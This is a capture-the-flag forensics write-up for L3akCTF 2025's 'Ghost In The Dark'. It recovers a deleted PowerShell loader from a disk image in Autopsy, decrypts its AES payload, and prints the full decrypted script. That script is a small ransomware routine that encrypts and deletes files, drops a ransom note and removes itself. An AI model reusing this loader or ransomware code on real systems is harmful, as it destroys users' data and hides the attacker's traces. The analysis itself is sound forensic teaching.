---
title: "L3akCTF_2025_(Ghost_In_The_Dark)"
date: 2025-12-28 00:00:00
categories: [CTF_competitions]
tags: [Disk_Forensics, Medium, Deleted_File]
toc: true
---

 
## Ghost In The Dark

![Image](/assets/img/5/5_1.jpg)

After download artifact from [this link](https://drive.google.com/file/d/1HZruZhvDAGLWDE9kFMBC4Pu8tSnfkOEJ/view)

While I was reading the challenge description, one important point caught my attention: “Recover what was lost.” This clearly suggests that the attacker deleted some files, which could help in solving the challenge.

open file in Autopsy

![Image](/assets/img/5/5_2.jpg)

You can find a PowerShell script in a deleted file named “loader.ps1.”
save it and open in editor

```powershell
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path

```

This file decrypts the contents of another file called “payload.enc” using the AES algorithm, and then deletes itself.
Now, let’s take a look at the other file.

```base64
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

```

You can find content that was encoded with Base64 and AES, so I wrote a Python script to decode it.


```python

from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


b64_data = """
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
""".replace("\n", "").strip()

key = b"0123456789abcdef"
iv = b"abcdef9876543210"


ciphertext = b64decode(b64_data)


cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)


print(plaintext.decode('utf-8', errors='replace'))

```

after decode it

```powershell

$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path

```

You might notice that this is a ransomware script—it encrypts files and deletes the original versions. Among these files is one named “flag”, but we can decrypt it using the same method since the AES key and IV are present in the file. So, let’s write another Python script to decrypt the flag.

But first, extract “flag.enc” from the disk image.

![Image](/assets/img/5/5_3.jpg)

```python

from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

with open("flag.enc", "rb") as f:
    data = f.read()

key = b"m4yb3w3d0nt3x1st"
iv  = b"l1f31sf0rl1v1ng!"

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(data), AES.block_size)
print(plaintext.decode())

```

finally we got the flag

![Image](/assets/img/5/5_4.jpg)

# Thanks For Reading

